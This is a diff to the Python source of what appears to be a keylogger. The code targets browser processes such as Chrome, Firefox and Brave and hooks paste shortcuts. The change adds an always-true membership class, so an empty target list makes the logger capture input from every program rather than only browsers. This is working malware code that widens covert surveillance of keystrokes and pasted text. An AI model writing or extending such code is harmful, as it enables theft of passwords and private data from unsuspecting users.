@@ -16,13 +16,17 @@ from .keyboard import BrowserHotKeys
 
 browsers=("iexplore.exe", "chrome.exe", "firefox.exe", "Yandex.exe", "opera.exe", "UCBrowser.exe", "Brave.exe")
 
+class Any:
+    def __contains__(self, item):
+        return True
+
 class Keyloger:
     def __init__(self, command_sec, max_size:"MB"=3, targets:Tuple=browsers):
         log.info(f'key logger started for {targets}')
         log.debug(f"command_sec: {command_sec}, max_size: {max_size}")
 
         self.command_sec=command_sec
-        self.targets = targets
+        self.targets = targets or Any()
         self.keys={
             "<ctrl>+v":self.paste,
             "<shift>+<insert>":self.paste
